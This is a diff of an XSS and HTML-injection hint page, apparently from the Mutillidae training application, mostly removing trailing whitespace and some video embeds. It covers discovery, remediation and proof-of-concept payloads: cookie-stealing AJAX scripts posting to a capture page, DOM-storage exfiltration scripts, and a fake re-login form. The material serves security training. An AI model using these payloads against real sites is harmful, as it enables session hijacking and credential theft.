@@ -2,7 +2,7 @@
 			<span class="report-header">Overview</span>
 			<br/><br/>
 			Cross-site scripting and HTML injection may occcur
-			when user or attacker controlled input is later incorporated 
+			when user or attacker controlled input is later incorporated
 			without being encoded into the web server response. In other words, the attacker
 			can send input which later is incorporated into the web page the user receives.
 			<br/><br/>
@@ -16,53 +16,53 @@
 			<span class="report-header">Discovery Methodology</span>
 			<br/><br/>
 			The first step to Cross-Site Scripting is to determine which of the sites input is displayed as output.
-			Some input is immediately output on the same or next page. These pages are candidates for reflected 
+			Some input is immediately output on the same or next page. These pages are candidates for reflected
 			Cross-Site Scripting. Some input may be stored in a database and output later on the appropriate page.
 			These situations may be ripe for the most dangerous type of XSS; persistent XSS.
 			<br/><br/>
 			Developers may treat input from forms carefully, while completely ignoring input passed via URL Query
 			Parameters, Cookies, HTTP Headers, Logs, Emails, etc. The key is to encode ALL output and not just output
 			that came into the site via forms/POST.
-			<br/><br/>	
-			Step 1: For each page under scrutiny, enter a unique string into each form field, 
-			url query parameter, cookie value, HTTP Header, etc., record which value has which unique string, 
-			submit the page, then observe the resulting page to see if any of your unique strings appeared. 
+			<br/><br/>
+			Step 1: For each page under scrutiny, enter a unique string into each form field,
+			url query parameter, cookie value, HTTP Header, etc., record which value has which unique string,
+			submit the page, then observe the resulting page to see if any of your unique strings appeared.
 			Upon finding a unique string, note which value had contained that string and record this on your map.
 			<br/><br/>
 			For example inject all available parameters of the web page with a searchable string
-			such as the word "CANARY" along with characters generally useful in 
+			such as the word "CANARY" along with characters generally useful in
 			writing HTML, JavaScript or other code. Search the response carefully
-			noting any location where the test string appears unencoded. These 
-			locations may allow cross-site scripting. See 
+			noting any location where the test string appears unencoded. These
+			locations may allow cross-site scripting. See
 			<a href="http://ha.ckers.org/xss.html">Rsnake\'s XSS Cheet Sheet</a>
-			for more ways you can encode XSS attacks that may 
+			for more ways you can encode XSS attacks that may
 			allow bypassing some filters.
 			<br/><br/>
 			An example injection might be &lt;CANARY={}&quot;&quot;()&#39;&#39;;#$--/&gt;1.
-			Adding a sequencial integer to the test input can help determine which of the 
+			Adding a sequencial integer to the test input can help determine which of the
 			inputs parameters resulted in the response string found.
 			<br/><br/>
-			Step 2:The second step is to test all the input locations from step #1 with various scripts, css, html tags, etc. 
+			Step 2:The second step is to test all the input locations from step #1 with various scripts, css, html tags, etc.
 			and observe the resulting output. If the site fails to encode output, it is a candidate for XSS.
 			<br/><br/>
-			Enter interesting characters such as angle brackets for HTMLi and XSS, Cascading style 
-			sheet symbols, etc. to see if the site encodes this output. If the site does not encode output, try 
+			Enter interesting characters such as angle brackets for HTMLi and XSS, Cascading style
+			sheet symbols, etc. to see if the site encodes this output. If the site does not encode output, try
 			inserting XSS, CSS, HTML, etc. and watch for execution. If the site has a WAF, this is likely the point
 			at which you will detect the WAF presence.
 			<br/><br/>
-			Unfortunately the input could end up as output on any page within the site, all pages within the site, 
+			Unfortunately the input could end up as output on any page within the site, all pages within the site,
 			or none of them. If the values are not reflected immediately but presented on a later page (for example
-			in search results) then it should be assumed the value is stored in a database.   
+			in search results) then it should be assumed the value is stored in a database.
 			<br/><br/>
 			<span class="report-header">Remediation</span>
 			<br/><br/>
 			Cross-Site Scripting occurs because a script is displayed in page output but is not properly encoded.
 			Because of the lack of proper encoding, the browser will execute the script rather than display it as data.
 			Pages that encode all dynamic output are generally immune. The page will simply display the script as text
-			rather than execute the script as code.		 
+			rather than execute the script as code.
 			<br/><br/>
 			The first step to Cross-Site Scripting is to determine which of the sites input is displayed as output.
-			Some input is immediately output on the same or next page. These pages are candidates for reflected 
+			Some input is immediately output on the same or next page. These pages are candidates for reflected
 			Cross-Site Scripting. Some input may be stored in a database and output later on the appropriate page.
 			These situations may be ripe for the most dangerous type of XSS; persistent XSS.
 			<br/><br/>
@@ -77,7 +77,7 @@
 			<br/><br/>
 			Cross site scripting will work in any unencoded output. It does not matter if the value being output
 			initially came from a form field (usually POST) or URL parameteres (GET). If fact the value can come from any
-			source. For example, if a web page outputs the user-agent string in whole or part, you can use a tool such 
+			source. For example, if a web page outputs the user-agent string in whole or part, you can use a tool such
 			as User-Agent Switcher plug-in for Firefox to attempt XSS via the User-Agent HTTP Header. Any HTTP Header
 			can be forged with or without tools. If you would like to forge an HTTP Header without tools, try Netcat. Other
 			options include intercepting and changing the web request after the request leaves the browser. Burp Suite
@@ -88,11 +88,11 @@
 			to pass through the validation to get there, input validation will not work.
 			<br/><br/>
 			Some pages are easier to exploit because the page reflects any input. This input
-			could be from the Cookies, and URL query parameter, or any POSTed parameter. 
+			could be from the Cookies, and URL query parameter, or any POSTed parameter.
 			This may be seen in the view source as a comment in which the developer
 			dumps the referer string for diagnostic purpouses (and therefore dumps
 			the query parameters as well). When a random parameter is created and injected,
-			this is known as a parameter addition attack.  
+			this is known as a parameter addition attack.
 			<br/><br/>
 			<span class="report-header">Cross Site Scripting Via URL query parameters</span>
 			<br/><br/>
@@ -104,63 +104,63 @@
 			<br/><br/>
 			<span class="report-header">Cross Site Scripting Via Cookie</span>
 			<br/><br/>
-			Use Cookie Manager or Burp-Suite to create a cross site script and inject a script into each cookie. 
-			If the page prints the value of the cookie to the screen, the script 
+			Use Cookie Manager or Burp-Suite to create a cross site script and inject a script into each cookie.
+			If the page prints the value of the cookie to the screen, the script
 			will execute.
 			<br/><br/>
 			<span class="report-header">Cross Site Scripting Via HTTP Headers</span>
 			<br/><br/>
-			Any time dynamic output is displayed by the browser, think "Cross-Site Scripting". 
-			Work backwards from that output to see if there is a way to influence 
-			what is output. This could be as simple as entering "123" in the first field, 
-			"456" in the second field, and so on. Repeat this for all input including HTTP 
-			Headers, Cookie values, Hidden Fields etc. If those inputs show up anywhere in the output 
-			investigate further. Dont look for visible output. That will miss most of the output. 
-			Search the entire response stream including all the HTTP Headers. If you find 
-			your test strings, send in more useful characters such as "&lt;". 
-			Some developers sanitize input which may later be output. 
+			Any time dynamic output is displayed by the browser, think "Cross-Site Scripting".
+			Work backwards from that output to see if there is a way to influence
+			what is output. This could be as simple as entering "123" in the first field,
+			"456" in the second field, and so on. Repeat this for all input including HTTP
+			Headers, Cookie values, Hidden Fields etc. If those inputs show up anywhere in the output
+			investigate further. Dont look for visible output. That will miss most of the output.
+			Search the entire response stream including all the HTTP Headers. If you find
+			your test strings, send in more useful characters such as "&lt;".
+			Some developers sanitize input which may later be output.
 			Others encode (escape) the input. These are nice tries but can result in
 			"FAIL" because the data could be changed after it is input encoded by
-			someone with access to the database, a database corrupting script, or 
+			someone with access to the database, a database corrupting script, or
 			any attempts to filter/sanitize can be flawed/bypassed.
 			<br/><br/>
-			Any time the application uses the HTTP headers there are multiple 
+			Any time the application uses the HTTP headers there are multiple
 			possibilities. If the HTTP header is output into the page, think XSS.
-			But with HTTP Headers, also consider 
-			HTTP Response Splitting. HTTP Headers are delimited (separated) by line-breaks. 
-			Check out the RFC on HTTP to see the specification. 
+			But with HTTP Headers, also consider
+			HTTP Response Splitting. HTTP Headers are delimited (separated) by line-breaks.
+			Check out the RFC on HTTP to see the specification.
 			When an application included some type of input
 			as output into the HTTP Header, it may be possible to inject a line-break.
-			If this is possible, then an actor could also inject a new HTTP Header of 
-			there choosing. These two situations are counterparts. XSS via HTTP Headers 
-			may occur when HTTP Request Headers are output into the HTTP Response. 
-			HTTP Response Splitting may occur when user/database input is output into 
+			If this is possible, then an actor could also inject a new HTTP Header of
+			there choosing. These two situations are counterparts. XSS via HTTP Headers
+			may occur when HTTP Request Headers are output into the HTTP Response.
+			HTTP Response Splitting may occur when user/database input is output into
 			HTTP Headers.
 			<br/><br/>
-			Try Tamper Data to get control of all the HTTP headers in the request. 
+			Try Tamper Data to get control of all the HTTP headers in the request.
 			You can start by changing the user-agent to see your input displayed here.
 			<br/><br/>
 			<span class="report-header">Examples - Proof of Concept</span>
-			<br/><br/>	
+			<br/><br/>
 			Many examples can be found at <a href="http://ha.ckers.org/xss.html">http://ha.ckers.org/xss.html</a>.
 			A basic test for XSS may be the following that attempts to pop up an alert box
 			<br/><br/>
 <code>&lt;script&gt;alert("XSS");&lt;/script&gt;</code>
 			<br/><br/>
-			This example is of stealing a cookie. This could be reflected or persistent. 
+			This example is of stealing a cookie. This could be reflected or persistent.
 			To make this persistent, try to get the script stored into
 			a database field which is later output onto a web page.
 			<br/><br/>
 <code>&lt;script&gt;alert(&#39;Cookies which do not have the HTTPOnly attribute set: &#39; + document.cookie);&lt;/script&gt;</code>
 			<br/><br/>
 			Same example with the single-quotes escaped for databases such as MySQL. This allows the XSS to be stored in the database.
-			When the web site (or another site) pulls the XSS from the database at a later time, it will be served with the 
+			When the web site (or another site) pulls the XSS from the database at a later time, it will be served with the
 			site content.
 			<br /><br />
 <code>&lt;script&gt;alert(\&#39;Cookies which do not have the HTTPOnly attribute set: \&#39; + document.cookie);&lt;/script&gt;</code>
 			<br/><br/>
 			<span class="report-header">Examples - Stealing Cookies</span>
-			<br/><br/>	
+			<br/><br/>
 			A more realistic attempt of cookie stealing includes some mechanism to send the value
 			of the cookie to an attacker controlled server
 			<br />
@@ -183,14 +183,14 @@
 </code>
 <br/><br/>
 			<span class="report-header">Examples - Stealing cookies quietly with AJAX</span>
-			<br/><br/>	
+			<br/><br/>
 			This example forwards the cookies to the Mutillidae Capture Data page using an AJAX
 			request running in the background
 			<br/>
 <code>
 &lt;script&gt;
 	var lXMLHTTP;
-	try{ 
+	try{
 		var lData = &quot;data=&quot; + encodeURIComponent(document.cookie);
 		var lHost = &quot;localhost&quot;;
 		var lProtocol = &quot;http&quot;;
@@ -199,77 +199,77 @@
 		var lMethod = &quot;POST&quot;;
 
 		try {
-			lXMLHTTP = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;); 
-		}catch (e) { 
-			try { 
-				lXMLHTTP = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); 
-			}catch (e) { 
-				try { 
-					lXMLHTTP = new XMLHttpRequest(); 
-				}catch (e) { 
+			lXMLHTTP = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);
+		}catch (e) {
+			try {
+				lXMLHTTP = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
+			}catch (e) {
+				try {
+					lXMLHTTP = new XMLHttpRequest();
+				}catch (e) {
 					alert(e.message);/*For testing only*/
-				} 
-			} 
+				}
+			}
 		}/*end try*/
 
 		lXMLHTTP.onreadystatechange = function(){};
 		lXMLHTTP.open(lMethod, lAction, true);
-		lXMLHTTP.setRequestHeader(&quot;Host&quot;, lHost); 
-		lXMLHTTP.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);			
+		lXMLHTTP.setRequestHeader(&quot;Host&quot;, lHost);
+		lXMLHTTP.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);
 		lXMLHTTP.send(lData);
 
 	}catch(e){
 		alert(e.message);/*For testing only*/
-	} 
+	}
 &lt;/script&gt;
 </code>
 			<br/><br/>
 			<span class="report-header">Examples - HTML Injection</span>
-			<br/><br/>	
+			<br/><br/>
 			JavaScript is not the only language that can be used. HTML is another choice that can be effective.
 			<br/><br/>
 <code>&lt;h1&gt;Sorry. There has been a system error.&lt;br /&gt;&lt;br /&gt;Please login again&lt;/h1&gt;&lt;br/&gt;Username&lt;input type=&quot;text&quot;&gt;&lt;br/&gt;Password&lt;input type=&quot;text&quot;&gt;&lt;br/&gt;&lt;br/&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;&lt;h1&gt;&amp;nbsp;&lt;/h1&gt;</code>
 			<br/><br/>
 			<span class="report-header">Examples - Realistic Attack</span>
-			<br/><br/>	
+			<br/><br/>
 			AJAX can make the XSS more stealthy
-			<br/><br/>			
+			<br/><br/>
 			<span class="report-header">Example (Mutillidae running at localhost)</span>
 			<br/><br/>
-<code>		
+<code>
 &lt;script&gt;
 		var lXMLHTTP;
-		try{ 
+		try{
 			var lData = &quot;data=&quot; + encodeURIComponent(document.cookie);
 			var lHost = &quot;localhost&quot;;
 			var lProtocol = &quot;http&quot;;
 			var lFilePath = &quot;/mutillidae/capture-data.php&quot;;
 			var lAction = lProtocol + &quot;://&quot; + lHost + lFilePath;
 			var lMethod = &quot;POST&quot;;
-	
+
 			try {
-				lXMLHTTP = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;); 
-			}catch (e) { 
-				try { 
-					lXMLHTTP = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); 
-				}catch (e) { 
-					try { 
-						lXMLHTTP = new XMLHttpRequest(); 
-					}catch (e) { 
+				lXMLHTTP = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);
+			}catch (e) {
+				try {
+					lXMLHTTP = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
+				}catch (e) {
+					try {
+						lXMLHTTP = new XMLHttpRequest();
+					}catch (e) {
 						alert(e.message);/*For testing only*/
-					} 
-				} 
+					}
+				}
 			}/*end try*/
-	
+
 			lXMLHTTP.onreadystatechange = function(){};
 			lXMLHTTP.open(lMethod, lAction, true);
-			lXMLHTTP.setRequestHeader(&quot;Host&quot;, lHost); 
-			lXMLHTTP.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);			
+			lXMLHTTP.setRequestHeader(&quot;Host&quot;, lHost);
+			lXMLHTTP.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);
 			lXMLHTTP.send(lData);
-	
+
 		}catch(e){
 			alert(e.message);/*For testing only*/
-		} 
+		}
 &lt;/script&gt;
 </code>
 			<br/><br/>
@@ -278,7 +278,7 @@
 <code>
 &lt;script&gt;
 	var lXMLHTTP;
-	try{ 
+	try{
 		var lData = &quot;data=&quot; + encodeURIComponent(document.cookie);
 		var lHost = &quot;mutillidae.local&quot;;
 		var lProtocol = &quot;http&quot;;
@@ -287,35 +287,35 @@
 		var lMethod = &quot;POST&quot;;
 
 		try {
-			lXMLHTTP = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;); 
-		}catch (e) { 
-			try { 
-				lXMLHTTP = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); 
-			}catch (e) { 
-				try { 
-					lXMLHTTP = new XMLHttpRequest(); 
-				}catch (e) { 
+			lXMLHTTP = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);
+		}catch (e) {
+			try {
+				lXMLHTTP = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
+			}catch (e) {
+				try {
+					lXMLHTTP = new XMLHttpRequest();
+				}catch (e) {
 					alert(e.message);/*For testing only*/
-				} 
-			} 
+				}
+			}
 		}/*end try*/
 
 		lXMLHTTP.onreadystatechange = function(){};
 		lXMLHTTP.open(lMethod, lAction, true);
-		lXMLHTTP.setRequestHeader(&quot;Host&quot;, lHost); 
-		lXMLHTTP.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);			
+		lXMLHTTP.setRequestHeader(&quot;Host&quot;, lHost);
+		lXMLHTTP.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);
 		lXMLHTTP.send(lData);
 
 	}catch(e){
 		alert(e.message);/*For testing only*/
-	} 
+	}
 &lt;/script&gt;
 </code>
 			<br/>
 			Note that some characters which are reserved in databases are also reserved
-			in web servers. If submitting injections directly via an interception proxy 
+			in web servers. If submitting injections directly via an interception proxy
 			like Burp-Suite, URL encode the injection to avoid a syntax error on the
-			web server. 
+			web server.
 			<br/><br/>
 			<span class="report-header">URL Encoded version (with TAB spaces (%09) removed</span>
 			<br/>
@@ -324,32 +324,32 @@
 </code>
 			<br/><br/>
 			<span class="report-header">Steal DOM Storage values from another users browser (intermediate)</span>
-			<br/><br/>	
+			<br/><br/>
 			Peristent (Stored, Second Order) Cross Site Script
 			NOTE: This version &quot;MySQL escapes&quot; the &quot;\n&quot; new-line character by doubling up the &quot;\&quot; character because &quot;\n&quot; means new-line in MySQL and this is going to be inserted into the database.
 			<br />
 <code>
 &lt;script&gt;try{var m = &quot;&quot;;var l = window.localStorage;for(i=0;i&lt;l.length;i++){
-var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\\n&quot;;}; 
+var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\\n&quot;;};
 document.location=&quot;http://localhost/mutillidae/capture-data.php?html5storage=&quot; + m;}catch(e){alert(e.message);}&lt;/script&gt;
 </code>
 			<br/><br/>
 			<span class="report-header">Steal DOM Storage values from another users browser (advanced)</span>
-			<br/><br/>	
+			<br/><br/>
 			Peristent (Stored, Second Order) Cross Site Script
 			NOTE: This version &quot;MySQL escapes&quot; the &quot;\n&quot; new-line character by doubling up the &quot;\&quot; character because &quot;\n&quot; means new-line in MySQL and this is going to be inserted into the database.
 			<br />
 <code>
-&lt;script&gt;try{ var s = sessionStorage; var l = localStorage; var m = &quot;&quot;; 
-var lXMLHTTP; for(i=0;i&lt;s.length;i++){ m += &quot;sessionStorage(&quot; + s.key(i) + &quot;):&quot; + s.getItem(s.key(i)) + &quot;; &quot;; } 
-for(i=0;i&lt;l.length;i++){ m += &quot;localStorage(&quot; + l.key(i) + &quot;):&quot; + l.getItem(l.key(i)) + &quot;; &quot;; } 
-var lAction = &quot;http://localhost/mutillidae/capture-data.php?html5storage=&quot; + m; lXMLHTTP = new XMLHttpRequest(); 
-lXMLHTTP.onreadystatechange = function(){}; lXMLHTTP.open(&quot;GET&quot;, lAction); 
+&lt;script&gt;try{ var s = sessionStorage; var l = localStorage; var m = &quot;&quot;;
+var lXMLHTTP; for(i=0;i&lt;s.length;i++){ m += &quot;sessionStorage(&quot; + s.key(i) + &quot;):&quot; + s.getItem(s.key(i)) + &quot;; &quot;; }
+for(i=0;i&lt;l.length;i++){ m += &quot;localStorage(&quot; + l.key(i) + &quot;):&quot; + l.getItem(l.key(i)) + &quot;; &quot;; }
+var lAction = &quot;http://localhost/mutillidae/capture-data.php?html5storage=&quot; + m; lXMLHTTP = new XMLHttpRequest();
+lXMLHTTP.onreadystatechange = function(){}; lXMLHTTP.open(&quot;GET&quot;, lAction);
 lXMLHTTP.send(&quot;&quot;); }catch(e){} &lt;/script&gt;
 </code>
 			<br/><br/>
 			<span class="report-header">Add/Edit value to another users DOM storage</span>
-			<br/><br/>	
+			<br/><br/>
 			Peristent (Stored, Second Order) Cross Site Script
 			NOTE: This version &quot;MySQL escapes&quot; the &quot;\n&quot; new-line character by doubling up the &quot;\&quot; character because &quot;\n&quot; means new-line in MySQL and this is going to be inserted into the database.
 			<br />
@@ -362,7 +362,7 @@ sessionStorage.setItem(&quot;SessionID&quot;,&quot;japurhgnalbjdgfaljkfr&quot;);
 </code>
 			<br/><br/>
 			<span class="report-header">Delete value from another users DOM storage</span>
-			<br/><br/>	
+			<br/><br/>
 			Peristent (Stored, Second Order) Cross Site Script
 			NOTE: This version &quot;MySQL escapes&quot; the &quot;\n&quot; new-line character by doubling up the &quot;\&quot; character because &quot;\n&quot; means new-line in MySQL and this is going to be inserted into the database.
 			<br />
@@ -370,44 +370,20 @@ sessionStorage.setItem(&quot;SessionID&quot;,&quot;japurhgnalbjdgfaljkfr&quot;);
 &lt;script&gt;try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStorage;
 for(i=0;i&lt;l.length;i++){var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\\n&quot;;};
 for(i=0;i&lt;s.length;i++){var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\\n&quot;;};alert(&quot;HTML-5 web storage:\\n\\n&quot; + m);}catch(e){alert(e.message);};localStorage.clear();sessionStorage.clear();try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStorage;for(i=0;i&lt;l.length;i++){var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\\n&quot;;};for(i=0;i&lt;s.length;i++){var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\\n&quot;;};alert(&quot;HTML-5 web storage:\\n\\n&quot; + m);}catch(e){alert(e.message);}&lt;/script&gt;
-</code>			
+</code>
 			<br/><br/>
 			<span class="report-header">Cross Site Scripting Defenses</span>
 			<br/><br/>
 			To defend against Cross-Site Scripting, encode all output per context.
-			Just because the application sanitized/validated/filtered the input 
-			when the user sent the input doesnt mean the application is safe. The 
-			database could be altered by a rouge insider, a database attack such as 
-			ASPROX, or a mallicious programmer. Developers should not have access to 
-			production database data; ever. Developers should not be able to copy 
+			Just because the application sanitized/validated/filtered the input
+			when the user sent the input doesnt mean the application is safe. The
+			database could be altered by a rouge insider, a database attack such as
+			ASPROX, or a mallicious programmer. Developers should not have access to
+			production database data; ever. Developers should not be able to copy
 			their own code into production; ever. That is what change control is for.
 			<br/><br/>
 			<span id="videos" class="report-header">Videos</span>
-			<br/><br/>			
-<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->CrossSiteScriptingExplainedPart1TheBasics);?>
-<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->CrossSiteScriptingExplainedPart2DOMBasedXSS);?>
-<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->CrossSiteScriptingExplainedPart3ReflectedXSS);?>
-<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->CrossSiteScriptingExplainedPart4StoredXSS);?>
-<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->IntroductiontolocatingReflectedCrosssiteScripting);?>
+			<br/><br/>
 <?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->ExplanationofHTTPOnlyCookiesinPresenceCrossSiteScripting);?>
-<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->BasicsofInjectingCrossSiteScriptintoHTMLonclickEvent);?>
-<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->IntroductiontoCrossSiteScriptingXSSviaJavaScriptStringInjection);?>
-<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->InjectingaCrossSiteScriptviaCascadingStylesheetContext);?>
-<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->CrossSiteScriptingExplainedPart10PathRelativeStylesheetInjection);?>
-<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->TwoMethodstoStealSessionTokenusingCrossSiteScripting);?>
-<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->InjectingCrossSiteScriptsXSSintoLogPageviaCookie);?>
-<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->SendingPersistentCrosssiteScriptsintoWebLogstoSnagWebAdmin);?>
-<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->IntroductiontotheBrowserExploitationFramework);?>
-<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->XSSbypassingJavaScriptValidation);?>
 <?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->ReadingHiddenValuesfromHTML5DomStorage);?>
-<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->AddingValuestoDOMStorageusingCrosssiteScripting);?>
-<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->AlterValuesinHTML5WebStorageusingCrosssiteScript);?>
-<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->AlterValuesinHTML5WebStorageusingReflectedCrosssiteScript);?>
-<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->AlterValuesinHTML5WebStorageusingPersistentCrosssiteScript);?>
-
-<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->GenerateCrossSiteScriptswithSQLInjection);?>
-<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->WebPenTestingHTML5WebStorageusingJSONInjection);?>
-<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->StealingHTML5StorageviaJSONInjection);?>
-<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->IntroductiontoHTMLInjectionHTMLiandCrossSiteScriptingXSSUsingMutillidae);?>
-
 <br/><br/>
